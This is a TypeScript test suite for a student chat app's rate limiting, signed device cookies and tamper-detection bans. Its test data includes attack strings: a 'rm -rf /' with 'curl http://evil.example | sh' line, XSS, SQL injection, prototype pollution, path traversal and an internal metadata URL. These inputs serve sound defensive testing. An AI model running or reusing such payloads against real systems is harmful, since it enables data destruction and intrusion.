import assert from 'node:assert/strict'
import { mkdtempSync, readFileSync, rmSync, utimesSync, writeFileSync } from 'node:fs'
import type { IncomingMessage, ServerResponse } from 'node:http'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import test from 'node:test'

const dataDir = mkdtempSync(join(tmpdir(), 'mint-devices-'))
process.env.MINT_DEVICE_SECRET = 'device-test-secret-0123456789abcdef'
process.env.MINT_DATA_DIR = dataDir
delete process.env.MINT_RATE_LIMIT
delete process.env.MINT_IP_RATE_LIMIT
delete process.env.RENDER
delete process.env.MINT_TRUST_PROXY_HEADERS

const { BanStore, BAN_MS, setBanStore } = await import('../server/bans')
const { clock } = await import('../server/clock')
const { identifyDevice, DEVICE_COOKIE, resetDeviceSecret } = await import('../server/device')
const {
  CHAT_RATE_LIMIT,
  SPAM_QUIET_MS,
  SPAM_THRESHOLD,
  describeWait,
  guardApi,
  resetLimits,
} = await import('../server/limits')
const {
  BAN_THRESHOLD,
  inspectChatBody,
  inspectCspReport,
  inspectPath,
  recordCspReport,
  recordTamper,
  resetTamperState,
} = await import('../server/tamper')

let now = 1_700_000_000_000
clock.now = () => now
const advance = (ms: number) => {
  now += ms
}

const banFile = join(dataDir, 'device-bans.json')
function freshWorld() {
  resetLimits()
  resetTamperState()
  resetDeviceSecret()
  rmSync(banFile, { force: true })
  setBanStore(new BanStore(banFile))
  now = 1_700_000_000_000
}

function fakeRequest(headers: Record<string, string>, remote: string, userAgent = 'TestBrowser/1.0') {
  return {
    headers: { 'user-agent': userAgent, ...headers },
    socket: { remoteAddress: remote },
    url: '/api/chat',
  } as unknown as IncomingMessage
}

function fakeResponse() {
  const headers = new Map<string, string | string[]>()
  const raw = {
    statusCode: 0,
    headersSent: false,
    writableEnded: false,
    body: '',
    setHeader(name: string, value: string | string[]) {
      headers.set(name.toLowerCase(), value)
    },
    getHeader(name: string) {
      return headers.get(name.toLowerCase())
    },
    end(chunk?: string) {
      this.writableEnded = true
      this.body = chunk ?? ''
    },
  }
  return { raw, res: raw as unknown as ServerResponse, headers }
}

/** A browser: remembers its device cookie between requests, like a real one. */
class Browser {
  cookie = ''

  /** A real browser loads the page, and so receives its cookie, before it calls any API. */
  constructor(
    readonly address = '203.0.113.50',
    visit = true,
  ) {
    if (visit) {
      const { res, headers } = fakeResponse()
      identifyDevice(this.request(), res)
      this.take(headers)
    }
  }

  request() {
    return fakeRequest(this.cookie ? { cookie: this.cookie } : {}, this.address)
  }

  take(headers: Map<string, string | string[]>) {
    const set = headers.get('set-cookie')
    const found = (Array.isArray(set) ? set : set ? [set] : []).find((item) => item.startsWith(`${DEVICE_COOKIE}=`))
    if (found) this.cookie = found.split(';')[0]
  }

  send(kind: 'chat' | 'web' = 'chat') {
    const { raw, res, headers } = fakeResponse()
    const ok = guardApi(this.request(), res, kind)
    this.take(headers)
    return { ok, status: raw.statusCode, body: raw.body ? JSON.parse(raw.body) : null, headers }
  }
}

/** One message a second: far below the spam rule. */
function sendSteadily(browser: InstanceType<typeof Browser>, times: number) {
  let last = browser.send()
  for (let index = 1; index < times; index += 1) {
    advance(1_000)
    last = browser.send()
  }
  return last
}

test('a device gets a signed cookie, and only this server can make one', () => {
  freshWorld()
  const first = new Browser('203.0.113.50', false)
  assert.equal(first.cookie, '')
  const reply = first.send()
  assert.equal(reply.ok, true)
  const setCookie = String(reply.headers.get('set-cookie'))
  assert.match(setCookie, /^mint_device=v1\.[\w-]{22}\.\d+\.[\w-]{32}; Path=\/; Max-Age=\d+; HttpOnly; SameSite=Lax$/)

  // The same cookie is the same device.
  const again = identifyDevice(first.request())
  assert.equal(again.known, true)
  assert.equal(again.id, first.cookie.split('.')[1])

  // Altering any part makes it unreadable: it is then simply a new device.
  const parts = first.cookie.split('.')
  const altered = [
    `${parts[0]}.${parts[1].replace(/.$/, parts[1].endsWith('A') ? 'B' : 'A')}.${parts[2]}.${parts[3]}`,
    `${parts[0]}.${parts[1]}.9999999999.${parts[3]}`,
    `${parts[0]}.${parts[1]}.${parts[2]}.${parts[3].replace(/.$/, parts[3].endsWith('A') ? 'B' : 'A')}`,
    'mint_device=garbage',
  ]
  for (const cookie of altered) {
    const device = identifyDevice(fakeRequest({ cookie: cookie.startsWith('mint_device=') ? cookie : `${DEVICE_COOKIE}=${cookie}` }, '203.0.113.50'))
    assert.equal(device.known, false, `${cookie} must not be accepted`)
    assert.notEqual(device.id, parts[1])
  }
})

test('the message limit is per device, not per network', () => {
  freshWorld()
  const a = new Browser('198.51.100.7')
  const b = new Browser('198.51.100.7') // same network, a different device
  for (let index = 0; index < CHAT_RATE_LIMIT; index += 1) {
    assert.equal(a.send().ok, true, `A message ${index + 1}`)
    advance(1_000)
  }
  const blocked = a.send()
  assert.equal(blocked.ok, false)
  assert.equal(blocked.status, 429)
  assert.equal(blocked.body.error.code, 'CLIENT_RATE_LIMIT')

  // B shares A's address yet is untouched.
  assert.equal(b.send().ok, true)
})

test('a limited device is told exactly how long to wait, and is let back in then', () => {
  freshWorld()
  const browser = new Browser()
  for (let index = 0; index < CHAT_RATE_LIMIT; index += 1) {
    browser.send()
    advance(1_000)
  }
  const blocked = browser.send()
  const { retryAfter, retryAt } = blocked.body.error
  // The first message was sent 15 seconds ago, so it falls out of the minute in 45.
  assert.equal(retryAfter, 45)
  assert.equal(retryAt, now + 45_000)
  assert.equal(blocked.headers.get('retry-after'), '45')
  assert.match(blocked.body.error.message, /45 seconds/)

  advance(44_000)
  assert.equal(browser.send().ok, false)
  advance(1_000)
  assert.equal(browser.send().ok, true)
})

test('1.5 messages a second for 5 seconds locks sending until the device stops', () => {
  freshWorld()
  assert.equal(SPAM_THRESHOLD, 8)
  const spammer = new Browser()
  // 1.4 a second never trips it, however long it lasts inside the minute.
  for (let index = 0; index < 7; index += 1) {
    assert.equal(spammer.send().ok, true)
    advance(700)
  }
  advance(10_000)

  // 2 a second does, as soon as 8 attempts land inside 5 seconds.
  const fast = new Browser('203.0.113.99')
  let outcome = fast.send()
  for (let index = 1; index < SPAM_THRESHOLD; index += 1) {
    assert.equal(outcome.ok, true, `attempt ${index} is still fine`)
    advance(500)
    outcome = fast.send()
  }
  assert.equal(outcome.ok, false)
  assert.equal(outcome.status, 429)
  assert.equal(outcome.body.error.code, 'SPAM_BLOCK')
  assert.equal(outcome.body.error.retryAfter, SPAM_QUIET_MS / 1000)

  // Carrying on keeps it locked, and every attempt restarts the quiet period.
  for (let index = 0; index < 6; index += 1) {
    advance(3_000)
    const again = fast.send()
    assert.equal(again.body.error.code, 'SPAM_BLOCK', 'still locked while it keeps sending')
    assert.equal(again.body.error.retryAfter, SPAM_QUIET_MS / 1000)
  }

  // Stopping for the quiet period unlocks it.
  advance(SPAM_QUIET_MS - 1)
  assert.equal(fast.send().body.error.code, 'SPAM_BLOCK')
  advance(SPAM_QUIET_MS + 1)
  assert.equal(fast.send().ok, true)
})

test('clearing cookies does not give unlimited use: the network ceiling and anonymous budget hold', () => {
  freshWorld()
  // Five real devices on one network share a ceiling of 4x the device budget.
  const devices = Array.from({ length: 5 }, () => new Browser('192.0.2.10'))
  let allowed = 0
  let ceilingHit = ''
  for (let round = 0; round < 13 && !ceilingHit; round += 1) {
    for (const device of devices) {
      advance(250)
      const outcome = device.send()
      if (outcome.ok) allowed += 1
      else if (outcome.body.error.code === 'NETWORK_RATE_LIMIT') ceilingHit = outcome.body.error.code
    }
  }
  assert.equal(allowed, CHAT_RATE_LIMIT * 4)
  assert.equal(ceilingHit, 'NETWORK_RATE_LIMIT')

  // A client that never keeps its cookie is counted per network at the device budget.
  freshWorld()
  let passed = 0
  for (let index = 0; index < 30; index += 1) {
    const { res } = fakeResponse()
    if (guardApi(fakeRequest({}, '192.0.2.77'), res, 'chat')) passed += 1
    advance(1_000)
  }
  assert.equal(passed, CHAT_RATE_LIMIT)
})

test('web requests have their own, larger, per-device budget', () => {
  freshWorld()
  const browser = new Browser()
  for (let index = 0; index < 60; index += 1) {
    assert.equal(browser.send('web').ok, true)
    advance(100)
  }
  assert.equal(browser.send('web').ok, false)
  assert.equal(browser.send('chat').ok, true, 'web use does not spend the message budget')
})

const KNOWN = new Set(['nemotron-lightning', 'gemma-4-31b'])
const normalBody = () => ({
  model: 'gemma-4-31b',
  temperature: 0.6,
  max_tokens: 8192,
  messages: [
    { role: 'system', content: 'About this student: Year 9' },
    { role: 'user', content: 'Explain photosynthesis' },
    { role: 'assistant', content: 'Plants turn light into sugar.' },
    {
      role: 'user',
      content: [
        { type: 'text', text: 'What is in this picture?' },
        { type: 'image_url', image_url: { url: 'data:image/jpeg;base64,/9j/4AAQSkZJRg==' } },
      ],
    },
  ],
})

test('what the real page sends is never treated as tampering', () => {
  assert.equal(inspectChatBody(normalBody(), KNOWN).weight, 0)
  // Nor are the other values the page sends: compaction, retries, no model chosen.
  assert.equal(inspectChatBody({ ...normalBody(), temperature: 0.2, max_tokens: 2048 }, KNOWN).weight, 0)
  assert.equal(inspectChatBody({ ...normalBody(), max_tokens: 16_384 }, KNOWN).weight, 0)
  const { model: _model, ...noModel } = normalBody()
  assert.equal(inspectChatBody(noModel, KNOWN).weight, 0)
  assert.equal(inspectChatBody({}, KNOWN).weight, 0)
})

test('code typed into a message is never an injection', () => {
  const attacks = [
    '<script>alert(document.cookie)</script>',
    "'; DROP TABLE users; --",
    '$(rm -rf /) && curl http://evil.example | sh',
    '{{constructor.constructor("return process")()}}',
    '"__proto__": {"admin": true}',
    '../../../etc/passwd',
    '<img src=x onerror=fetch("//evil")>',
    'javascript:alert(1)',
  ]
  for (const text of attacks) {
    const body = normalBody()
    body.messages.push({ role: 'user', content: text })
    body.messages.push({ role: 'user', content: [{ type: 'text', text }] as never })
    assert.equal(inspectChatBody(body, KNOWN).weight, 0, `a student may paste: ${text}`)
  }
})

test('edits only a hand-made request can contain are recognised', () => {
  const clear = (edit: (body: ReturnType<typeof normalBody>) => unknown, signal: string) => {
    const body = normalBody()
    const changed = (edit(body) ?? body) as never
    const result = inspectChatBody(changed, KNOWN)
    assert.ok(result.signals.includes(signal), `${signal} not found in ${JSON.stringify(result)}`)
    assert.ok(result.weight >= BAN_THRESHOLD, `${signal} should be a clear forgery`)
  }

  clear((body) => ({ ...body, model: 'gemma"; DROP TABLE x' }), 'model_injection')
  clear((body) => ({ ...body, model: '<script>x</script>' }), 'model_injection')
  clear((body) => ({ ...body, model: ['gemma-4-31b'] }), 'model_injection')
  clear((body) => ({ ...body, model: '../../etc/passwd' }), 'model_injection')
  clear(() => JSON.parse('{"model":"gemma-4-31b","messages":[],"__proto__":{"admin":true}}'), 'prototype_pollution')
  clear(() => JSON.parse('{"messages":[{"role":"user","content":"x","constructor":{"a":1}}]}'), 'prototype_pollution')
  clear((body) => ({ ...body, messages: 'hello' }), 'bad_messages_type')
  clear((body) => ({ ...body, messages: [{ role: 'tool', content: 'x' }] }), 'bad_role')
  clear((body) => ({ ...body, messages: [{ role: 'user; admin', content: 'x' }] }), 'bad_role')
  clear((body) => ({ ...body, messages: ['plain string'] }), 'bad_role')
  clear(
    (body) => ({ ...body, messages: [{ role: 'user', content: [{ type: 'input_audio', input_audio: {} }] }] }),
    'bad_part_type',
  )
  clear(
    (body) => ({
      ...body,
      messages: [{ role: 'user', content: [{ type: 'image_url', image_url: { url: 'http://169.254.169.254/latest' } }] }],
    }),
    'external_image_url',
  )
  clear(
    (body) => ({
      ...body,
      messages: [{ role: 'user', content: [{ type: 'image_url', image_url: { url: 'file:///etc/passwd' } }] }],
    }),
    'external_image_url',
  )
})

test('ambiguous differences are single strikes, not bans', () => {
  const strike = (edit: (body: ReturnType<typeof normalBody>) => unknown, signal: string) => {
    const result = inspectChatBody(edit(normalBody()) as never, KNOWN)
    assert.deepEqual(result.signals, [signal])
    assert.equal(result.weight, 1)
  }
  strike((body) => ({ ...body, model: 'retired-model-id' }), 'unknown_model')
  strike((body) => ({ ...body, tools: [] }), 'extra_fields')
  strike((body) => ({ ...body, temperature: 9 }), 'bad_params')
  strike((body) => ({ ...body, max_tokens: 5_000_000 }), 'bad_params')
  strike((body) => ({ ...body, max_tokens: 'lots' }), 'bad_params')
  strike(
    (body) => ({ ...body, messages: [{ role: 'user', content: 'x', name: 'someone' }] }),
    'extra_message_fields',
  )
})

test('path probing and script injection reports are strikes', () => {
  for (const path of ['/../../etc/passwd', '/a/%2e%2e/b', '/assets/..%5c..%5cwin.ini', '/x%00.html', '/%252e%252e/x']) {
    assert.deepEqual(inspectPath(path).signals, ['path_traversal'], path)
  }
  for (const path of ['/', '/index.html', '/assets/index-abc.js', '/api/chat?x=1..2', '/chat/some-id']) {
    assert.equal(inspectPath(path).weight, 0, path)
  }

  const report = (directive: string, blocked: string) => ({
    'csp-report': { 'effective-directive': directive, 'blocked-uri': blocked },
  })
  assert.equal(inspectCspReport(report('script-src-elem', 'inline')).weight, 1)
  assert.equal(inspectCspReport(report('script-src', 'eval')).weight, 1)
  assert.equal(inspectCspReport(report('script-src-elem', 'https://evil.example/x.js')).weight, 1)
  // Browser extensions and unrelated directives are not injections.
  assert.equal(inspectCspReport(report('script-src-elem', 'chrome-extension://abc/x.js')).weight, 0)
  assert.equal(inspectCspReport(report('img-src', 'https://cdn.example/a.png')).weight, 0)
  assert.equal(inspectCspReport(report('script-src', '')).weight, 0)
  assert.equal(inspectCspReport(null).weight, 0)
})

function knownDevice(address = '203.0.113.60') {
  return new Browser(address)
}

test('a clear forgery bans the device for exactly 24 hours and saves it', () => {
  freshWorld()
  const attacker = knownDevice()
  const id = attacker.cookie.split('.')[1]

  const { raw, res, headers } = fakeResponse()
  const ban = recordTamper(
    attacker.request(),
    res,
    inspectChatBody({ ...normalBody(), model: 'x"; DROP TABLE y' }, KNOWN),
  )
  assert.ok(ban)
  attacker.take(headers)
  assert.equal(raw.statusCode, 0)
  assert.equal(ban.id, id)
  assert.equal(ban.expiresAt - ban.bannedAt, BAN_MS)
  assert.equal(BAN_MS, 24 * 60 * 60 * 1000)
  assert.deepEqual(ban.signals, ['model_injection'])

  // Saved to disk, without the address or anything the user typed.
  const saved = JSON.parse(readFileSync(banFile, 'utf8')) as { bans: Array<Record<string, unknown>> }
  assert.equal(saved.bans.length, 1)
  assert.equal(saved.bans[0].id, id)
  assert.equal(saved.bans[0].userAgent, 'TestBrowser/1.0')
  assert.match(String(saved.bans[0].network), /^[0-9a-f]{12}$/)
  assert.ok(!readFileSync(banFile, 'utf8').includes('203.0.113.60'))

  // Every API is closed to that device, and it is told when it ends.
  for (const kind of ['chat', 'web'] as const) {
    const outcome = attacker.send(kind)
    assert.equal(outcome.ok, false)
    assert.equal(outcome.status, 403)
    assert.equal(outcome.body.error.code, 'DEVICE_BANNED')
    assert.equal(outcome.body.error.bannedUntil, ban.expiresAt)
    assert.equal(outcome.body.error.retryAfter, BAN_MS / 1000)
  }

  // It is over after 24 hours, not before.
  advance(BAN_MS - 1_000)
  assert.equal(attacker.send().status, 403)
  advance(1_001)
  assert.equal(attacker.send().ok, true)

  // Other devices were never affected.
  assert.equal(new Browser('203.0.113.60').send().ok, true)
})

test('a ban survives the server forgetting it, because the cookie carries it', () => {
  freshWorld()
  const attacker = knownDevice()
  const { res, headers } = fakeResponse()
  recordTamper(attacker.request(), res, inspectChatBody({ model: 'a b' }, KNOWN))
  attacker.take(headers)

  // A restart that loses the file and the in-memory list.
  rmSync(banFile, { force: true })
  setBanStore(new BanStore(banFile))
  resetLimits()
  resetTamperState()

  const outcome = attacker.send()
  assert.equal(outcome.status, 403)
  assert.equal(outcome.body.error.code, 'DEVICE_BANNED')
  // The record is written back, so the device is on file again.
  const restored = JSON.parse(readFileSync(banFile, 'utf8')) as { bans: Array<{ signals: string[] }> }
  assert.equal(restored.bans.length, 1)
  assert.deepEqual(restored.bans[0].signals, ['restored_from_cookie'])
})

test('a saved ban reaches a device whose cookie lacks it, and the cookie is brought up to date', () => {
  freshWorld()
  const device = knownDevice()
  const id = device.cookie.split('.')[1]
  setBanStore(new BanStore(banFile))
  const store = new BanStore(banFile)
  store.add({ id, bannedAt: now, expiresAt: now + BAN_MS, signals: ['manual'], userAgent: '', network: 'x' })
  setBanStore(store)

  const { raw, res, headers } = fakeResponse()
  assert.equal(guardApi(device.request(), res, 'chat'), false)
  assert.equal(raw.statusCode, 403)
  device.take(headers)
  // The refreshed cookie now states the ban itself.
  assert.ok(Number(device.cookie.split('.')[2]) * 1000 >= now + BAN_MS - 1_000)
})

test('strikes add up inside ten minutes, and fade after', () => {
  freshWorld()
  const device = knownDevice()
  const strike = () => {
    const { res, headers } = fakeResponse()
    const ban = recordTamper(device.request(), res, inspectChatBody({ ...normalBody(), model: 'retired-id' }, KNOWN))
    device.take(headers)
    return ban
  }

  assert.equal(strike(), null)
  advance(60_000)
  assert.equal(strike(), null)
  advance(60_000)
  assert.ok(strike(), `the ${BAN_THRESHOLD}rd strike within ten minutes bans`)

  freshWorld()
  const slow = knownDevice('203.0.113.61')
  const slowStrike = () => {
    const { res } = fakeResponse()
    return recordTamper(slow.request(), res, inspectChatBody({ ...normalBody(), model: 'retired-id' }, KNOWN))
  }
  assert.equal(slowStrike(), null)
  advance(6 * 60_000)
  assert.equal(slowStrike(), null)
  advance(6 * 60_000)
  assert.equal(slowStrike(), null, 'strikes older than ten minutes no longer count')
})

test('a request with no valid cookie has no device to ban', () => {
  freshWorld()
  const { res } = fakeResponse()
  const ban = recordTamper(
    fakeRequest({}, '203.0.113.70'),
    res,
    inspectChatBody({ model: 'x"y' }, KNOWN),
  )
  assert.equal(ban, null)
  assert.equal(new BanStore(banFile).list().length, 0, 'nothing is saved for a device that cannot be recognised again')
})

test('script-injection reports count once a minute and need repeating to ban', () => {
  freshWorld()
  const device = knownDevice()
  const report = { 'csp-report': { 'effective-directive': 'script-src-elem', 'blocked-uri': 'inline' } }
  const send = () => {
    const { res } = fakeResponse()
    return recordCspReport(device.request(), res, report)
  }

  // A page that fires a dozen reports at once is one strike, not a ban.
  for (let index = 0; index < 12; index += 1) assert.equal(send(), null)
  advance(61_000)
  assert.equal(send(), null)
  advance(61_000)
  assert.ok(send(), 'three separate minutes of injected scripts ban the device')
})

test('bans are read back from disk, and edits made while running are noticed', () => {
  freshWorld()
  const first = new BanStore(banFile)
  first.add({ id: 'AAAAAAAAAAAAAAAAAAAAAA', bannedAt: now, expiresAt: now + BAN_MS, signals: ['x'], userAgent: '', network: '' })
  first.add({ id: 'BBBBBBBBBBBBBBBBBBBBBB', bannedAt: now - 2 * BAN_MS, expiresAt: now - BAN_MS, signals: ['old'], userAgent: '', network: '' })

  const second = new BanStore(banFile)
  assert.equal(second.get('AAAAAAAAAAAAAAAAAAAAAA')?.signals[0], 'x')
  assert.equal(second.get('BBBBBBBBBBBBBBBBBBBBBB'), null, 'a finished ban no longer blocks')
  assert.equal(second.list().length, 2, 'but it stays on file as a record')
  assert.equal(second.list(true).length, 1)

  // An operator edits the file by hand while the server runs.
  const edited = JSON.parse(readFileSync(banFile, 'utf8')) as { bans: unknown[] }
  edited.bans = []
  writeFileSync(banFile, JSON.stringify(edited))
  utimesSync(banFile, new Date(now + 10_000), new Date(now + 10_000))
  advance(6_000)
  assert.equal(second.get('AAAAAAAAAAAAAAAAAAAAAA'), null)

  // Garbage on disk starts the store empty instead of crashing the server.
  writeFileSync(banFile, '{ not json')
  assert.equal(new BanStore(banFile).list().length, 0)
})

test('waits are described in plain words', () => {
  assert.equal(describeWait(1), '1 second')
  assert.equal(describeWait(45_000), '45 seconds')
  assert.equal(describeWait(60_000), '1 minute')
  assert.equal(describeWait(125_000), '2 minutes 5 seconds')
  assert.equal(describeWait(3_600_000), '1 hour')
  assert.equal(describeWait(BAN_MS), '24 hours')
  assert.equal(describeWait(BAN_MS - 61_000), '23 hours 58 minutes')
})

test.after(() => {
  rmSync(dataDir, { recursive: true, force: true })
})
